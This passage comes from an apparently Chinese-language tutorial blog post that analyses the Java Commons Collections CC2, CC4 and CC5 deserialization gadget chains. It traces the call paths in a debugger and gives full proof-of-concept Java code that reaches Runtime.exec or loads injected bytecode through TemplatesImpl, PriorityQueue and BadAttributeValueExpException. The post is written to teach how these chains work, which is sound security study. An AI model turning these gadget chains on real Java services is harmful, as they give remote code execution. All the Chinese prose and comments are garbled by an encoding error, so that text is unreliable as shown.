class="number">2</span>);<span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//åå°„è·å–æˆå‘˜å˜é‡çš„field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//è·å–è®¿é—®æƒé™</span></span><br><span class="line">        field.set(queue,comparator);<span class="comment">//è®¾ç½®å‚æ•°</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡pocæˆ‘ä»¬å‘ç°ååŠéƒ¨åˆ†ä¹Ÿæ˜¯ç”¨çš„ä¹Ÿæ˜¯invokertransformerè¿›è¡Œè§¦å‘çš„ï¼Œè¿™é‡Œä¸»è¦çœ‹å‰åŠéƒ¨åˆ†æ€ä¹ˆè°ƒç”¨çš„</p><p>è¿˜æ˜¯é€šè¿‡è·Ÿæ˜¯è°transformæ–¹æ³•æˆ‘ä»¬æ‰¾åˆ°äº†TransformingComparatorè¿™ä¸ªç±»ä¸­çš„compareæ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718150278-b61e0267-8fc1-42a8-a328-6bd031a8d11e.png"></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€å°†trangsformerå˜æˆinvokertransformerå¯¹è±¡å°±å¯ä»¥rceäº†</p><p>å†æ¥çœ‹çœ‹å…¶æ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718263591-c880068a-15be-4705-9b86-c3c6f2bf29d5.png"></p><p>å¯ä»¥çœ‹åˆ°transformeræ˜¯å¯æ§çš„æ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦æ‰¾åˆ°èƒ½å¤Ÿè§¦å‘compareçš„æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718373798-aaecb373-63f9-4b95-b6fc-615b6b0ce0ed.png"></p><p>æˆ‘ä»¬æ‰¾åˆ°äº†PriorityQueueç±»ä¸­çš„siftDownUsingComparatoræ–¹æ³•è°ƒç”¨äº†compareæ–¹æ³•ï¼Œè¿™é‡Œçœ‹ä¸‹æ„é€ æ–¹æ³•å‘ç°comparatorä¹Ÿæ˜¯å¯æ§çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718478028-692020a7-c1e9-47d5-b72f-e696f05b1e56.png"></p><p>æ‰€ä»¥ç°åœ¨éœ€è¦æ‰¾åˆ°å¯ä»¥è§¦å‘siftDownUsingComparatorçš„æ–¹æ³•æˆ‘ä»¬å‘ç°åœ¨æœ¬ç±»çš„siftDownæ–¹æ³•è°ƒç”¨äº†è¯¥æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718872060-36c80a00-7650-457e-857f-f5aa9a5d74bd.png"></p><p>å¹¶ä¸”åœ¨æœ¬ç±»çš„readObjectä¸­å‘ç°heapifyè°ƒç”¨äº†siftDownæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718555670-e74f356c-5991-4662-b0fa-d3ba3008b81f.png"></p><p>å¹¶ä¸”è¯¥sizeéœ€è¦å¤§äºç­‰äº2æ‰å¯ä»¥è¿›å…¥forå¾ªç¯æ‰€ä»¥å¯ä»¥æ„é€ pocäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°åœ¨åºåˆ—åŒ–ä¹‹å‰å°±è§¦å‘äº†åŸå› åœ¨äºaddæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718641827-ee67f3d4-9524-4118-88f3-30134d1b30a5.png"></p><p>è°ƒç”¨äº†offeræ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718669019-1053aa9e-85c4-448d-98bf-30f88a2a5086.png"></p><p>è¯¥æ–¹æ³•åˆè°ƒç”¨äº†siftUpæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718687690-eec61593-5bfb-4225-b5ea-20ca9ff9089d.png"></p><p>å‘ç°åœ¨è¯¥æ–¹æ³•ä¸­ä¹Ÿè°ƒç”¨äº†siftDownUsingComparatoræ–¹æ³•æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨addçš„æ—¶å€™å°†comparartorè®©å…¶å€¼ä¸ºç©ºï¼Œåœ¨addä¹‹ååœ¨åå°„å°†å…¶å€¼è¯¥ä¸ºTransformingComparatorå¯¹è±¡å°±è¡Œpocå¦‚å¼€å¤´æ‰€ç¤º</p><h3 id="cc2-è°ƒç”¨é“¾"><a href="#cc2-è°ƒç”¨é“¾" class="headerlink" title="cc2 è°ƒç”¨é“¾"></a>cc2 è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740045347-efcf625e-3fc6-400e-b021-6d8b84d8e192.png"></p><h3 id="è°ƒç”¨æ–¹å¼2"><a href="#è°ƒç”¨æ–¹å¼2" class="headerlink" title="è°ƒç”¨æ–¹å¼2"></a>è°ƒç”¨æ–¹å¼2</h3><p>ç¬¬äºŒç§è°ƒç”¨æ–¹æ³•å°±æ˜¯ç»“åˆCC3ä¸­æ‰€ä»‹ç»åˆ°çš„åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„å½¢å¼è¿›è¡Œè§¦å‘rceï¼Œå› ä¸ºé€šè¿‡ä¸Šæ–‡åˆ†æçš„æˆ‘ä»¬çŸ¥é“cc2ä¼šåœ¨TransformingComparatorè¿™ä¸ªç±»ä¸­çš„compareæ–¹æ³•ä¸­è°ƒç”¨transformæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æƒ³åˆ°åˆ©ç”¨Invokertransformè¿™ä¸ªç±»ä¸­çš„transformæ–¹æ³•æ¥è°ƒç”¨ä»»æ„ç±»çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åœ¨è¿™é‡Œæ³¨å…¥invokertransformå¯¹è±¡è°ƒç”¨transformæ–¹æ³•åœ¨è°ƒç”¨TemplateImplä¸­çš„newTransformeræ–¹æ³•æ¥è¿›è€Œè§¦å‘åŠ¨æ€ç±»åŠ è½½å®ç°rceã€‚</p><p>è¿™é‡Œç»™å‡ºpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line">       <span class="type">InvokerTransformer</span> <span class="variable">invokertransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;&#125;);</span><br><span class="line">       <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">       <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚</span></span><br><span class="line">       queue.add(templates);</span><br><span class="line">       queue.add(<span class="number">2</span>);<span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>).getDeclaredField(<span class="string">&quot;transformer&quot;</span>);<span class="comment">//åå°„è·å–æˆå‘˜å˜é‡çš„field</span></span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);<span class="comment">//è·å–è®¿é—®æƒé™</span></span><br><span class="line">       field.set(comparator,invokertransformer);<span class="comment">//è®¾ç½®å‚æ•°</span></span><br><span class="line">       <span class="comment">//serialize(queue);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>å…¶å®é€šè¿‡pocæˆ‘ä»¬èƒ½å¤Ÿå‘ç°å°±æ˜¯å°†æœ€åæ”¹æˆåŠ¨æ€è°ƒç”¨newTransformeræ–¹æ³•ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732359599-e550a791-ad16-48a8-baa8-89915e90bca2.png"></p><h4 id="é—®é¢˜1ï¼š"><a href="#é—®é¢˜1ï¼š" class="headerlink" title="é—®é¢˜1ï¼š"></a>é—®é¢˜1ï¼š</h4><p>è¿™é‡Œå…¶å®æˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³æ˜ç™½å°±æ˜¯åˆ©ç”¨invokertransformçš„transformæ–¹æ³•å»åŠ¨æ€è°ƒç”¨newTransformeræ–¹æ³•ä½†æ˜¯ä½ æ‰§è¡Œä¼šå‘ç°æŠ¥é”™æ‰¾ä¸åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰å°†è¯¥æ–¹æ³•çš„ç±»å¯¹è±¡ä¼ é€’è¿›å»è¿™é‡Œå¦‚ä½•ä¸åˆ©ç”¨ChainedTransformerè¿›è¡Œä¼ é€’å‘¢</p><p>é€šè¿‡è°ƒè¯•æˆ‘ä»¬å¯ä»¥é€šè¿‡addæ–¹æ³•è¿›è¡Œæ·»åŠ </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732743981-a67b8b99-d4cd-4898-8565-fb99f2d7e1b4.png"></p><p>ä»–ä¼šä¼ å…¥åˆ°offeré‡Œé¢ï¼Œofferä¼šç»§ç»­è°ƒç”¨ siftUpæ–¹æ³•</p><p>ç»§ç»­å°†æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ”¾è¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732814267-bc951645-86cb-4e72-beb6-3fd050fa821d.png"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æ˜¯è¢«ä¼ é€’è¿›æ¥äº†ã€‚</p><h4 id="é—®é¢˜2ï¼š"><a href="#é—®é¢˜2ï¼š" class="headerlink" title="é—®é¢˜2ï¼š"></a>é—®é¢˜2ï¼š</h4><p>ç„¶åæˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„pocåœ¨ä¸€å¼€å§‹çš„æ—¶å€™å¹¶æ²¡æœ‰å°†ä¸€ä¸ªçœŸçš„invokertransformeræ”¾è¿›å»<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732918709-a4c299c3-83cc-4390-94b8-03cb0e133357.png"></p><p>è€Œæ˜¯åœ¨addä¹‹åé€šè¿‡åå°„ä¿®æ”¹äº†å…¶å€¼ï¼Œè¿™é‡Œä¸Šæ–‡ä¹Ÿè¯´äº†æ˜¯ä¸ºäº†é˜²æ­¢åœ¨addæ—¶è§¦å‘rceã€‚</p><h4 id="é—®é¢˜3ï¼š"><a href="#é—®é¢˜3ï¼š" class="headerlink" title="é—®é¢˜3ï¼š"></a>é—®é¢˜3ï¼š</h4><p>å°±æ˜¯æˆ‘ä»¬åœ¨addçš„æ—¶å€™éœ€è¦ä¼ å…¥ä¸¤ä¸ªtemplateså¯¹è±¡å—ï¼Œè¿™é‡Œç»è¿‡å®éªŒåªéœ€è¦å¯¹ç¬¬ä¸€ä¸ªä¼ å…¥å³å¯ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå¿…é¡»ä¼ å…¥ã€‚æˆ‘ä»¬æ¥è°ƒè¯•çœ‹çœ‹ä¸ºä»€ä¹ˆæˆ‘ä»¬ä»¥åªä¼ å…¥ç¬¬ä¸€ä¸ªtemplateså¯¹è±¡ä¸ºä¾‹è¿›è¡Œååºåˆ—åŒ–è°ƒè¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733177259-e939a2b9-9259-44af-95c4-092e61efe2ba.png"></p><p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥çœ‹åˆ°å®ƒè·å–çš„æ˜¯ç¬¬ä¸€ä¸ªä¼ é€’çš„å‚æ•°çš„å€¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733194896-b2c9ae69-ef70-4c7b-a581-58effd95e190.png">ç»§ç»­è·Ÿè¿›å‘ç°ç¡®å®å–å‡ºæ¥çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733235272-4a1546c9-d040-42f1-86c9-7352f7293085.png"></p><p>è¿™é‡Œè°ƒç”¨çš„ä¹Ÿç¡®å®æ˜¯xçš„å€¼ï¼Œç»“åˆå‰é¢ä¸¤ä¸ªæ–¹æ³•åˆ†æè¯´æ˜ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»ä¼ å…¥templateså¯¹è±¡ã€‚</p><h3 id="cc2-TemplatesImplè°ƒç”¨é“¾"><a href="#cc2-TemplatesImplè°ƒç”¨é“¾" class="headerlink" title="cc2 TemplatesImplè°ƒç”¨é“¾"></a>cc2 TemplatesImplè°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740139727-d5bf08f6-e29f-4937-9eaa-82a02296e5c5.png"></p><h2 id="java-cc4é“¾"><a href="#java-cc4é“¾" class="headerlink" title="java  cc4é“¾"></a>java  cc4é“¾</h2><p>å…¶å®å¦‚æœææ‡‚äº†cc2 å’Œ cc3 ä¸¤æ¡é“¾ï¼Œcc4é“¾å°±æ²¡å•¥éš¾åº¦äº†ï¼Œå®ƒå°±æ˜¯è¿™ä¿©çš„ç»“åˆå…·ä½“åˆ†æçœ‹cc2 ä¸cc3</p><h3 id="cc4è°ƒç”¨é“¾"><a href="#cc4è°ƒç”¨é“¾" class="headerlink" title="cc4è°ƒç”¨é“¾"></a>cc4è°ƒç”¨é“¾</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.heapify()</span><br><span class="line">PriorityQueue.siftDown()</span><br><span class="line">PriorityQueue.siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter.TrAXFilter()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br></pre></td></tr></table></figure><p>è´´å‡ºpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ååŠæ®µç”¨çš„æ˜¯cc3</span></span><br><span class="line">        <span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line">        <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span> [] &#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span> [] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//å‰åŠæ®µæ˜¯cc2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚</span></span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>).getDeclaredField(<span class="string">&quot;transformer&quot;</span>);<span class="comment">//åå°„è·å–æˆå‘˜å˜é‡çš„field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//è·å–è®¿é—®æƒé™</span></span><br><span class="line">        field.set(comparator,chainedTransformer);<span class="comment">//è®¾ç½®å‚æ•°</span></span><br><span class="line">        <span class="comment">//serialize(queue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="java-cc5é“¾"><a href="#java-cc5é“¾" class="headerlink" title="java cc5é“¾"></a>java cc5é“¾</h2><p>cc5çš„è°ƒç”¨é“¾å’Œcc1 lazyMapè°ƒç”¨é“¾å¾ˆç›¸ä¼¼ï¼Œåªä¸è¿‡cc5è°ƒç”¨é“¾æœ€åè§¦å‘getæ–¹æ³•é‚£é‡Œå˜æˆäº†TiedMapEntryçš„toStringæ–¹æ³•ï¼Œç„¶ååˆ©ç”¨BadAttributeValueExpExceptionçš„readObjectè§¦å‘ã€‚</p><p>çœ‹ä¸€ä¸‹poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;11&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        <span class="comment">//serialize(badAttributeValueExpException);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡pocæˆ‘ä»¬å‘ç°ç›´åˆ°lazyMapéƒ½æ˜¯å’Œcc1ä¸€æ ·çš„è°ƒç”¨ï¼Œåé¢ä»Proxyæ”¹æˆäº†TiedMapEntryç±»</p><p>æˆ‘ä»¬çŸ¥é“è§¦å‘è¯¥æ¡é“¾æ˜¯éœ€è¦è§¦å‘åˆ°LazyMapçš„getæ–¹æ³•æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹</p><p><img 